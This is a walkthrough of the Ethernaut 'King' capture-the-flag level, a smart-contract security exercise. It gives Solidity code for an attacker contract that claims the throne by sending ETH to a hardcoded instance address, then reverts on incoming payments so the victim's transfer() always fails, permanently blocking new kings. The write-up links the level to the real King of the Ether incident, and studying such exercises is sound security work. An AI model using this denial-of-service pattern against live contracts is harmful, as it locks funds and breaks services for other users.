# King

## Key

> transfer() will revert if the external transaction reverts.
> https://blog.sigmaprime.io/solidity-security.html#ou-example

**Strategy**
After becoming king, when instance tries to took over:

```
 receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value); // we need to revert here
    king = msg.sender; // this wont execute
    prize = msg.value; // this wont execute
  }
```

`transfer()` wont succed if Attacker contract has no matching function to receive that payment: not having a payable callback or event having that callback with a `revert()` in it.

## Solution

1. Become king paying more than price to victims contract. Deploying the King contract with 1 ETH:

```
constructor() public payable {
    // triggers fallback function on Kings contract.
    // contract.prize() == 13008896
    address(0xB5Dc074E7484D32Faf3cb747E2b7cc28b4a203d5).call{value: msg.value}("");
}
```

2. Avoid having a fallback payable function, to cut the execution process on `king.transfer()`. Or including a `revert()` in it:

```
function() external payable {
  revert("PWN");
 }
```

3. Select verify instance. Nobody can become a new king, even if they want to pay more than our prize because `king = msg.sender` wont ever executes.

## Post solution info

Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

In this case, see: King of the Ether and King of the Ether Postmortem: https://www.kingoftheether.com/thrones/kingoftheether/index.html http://www.kingoftheether.com/postmortem.html
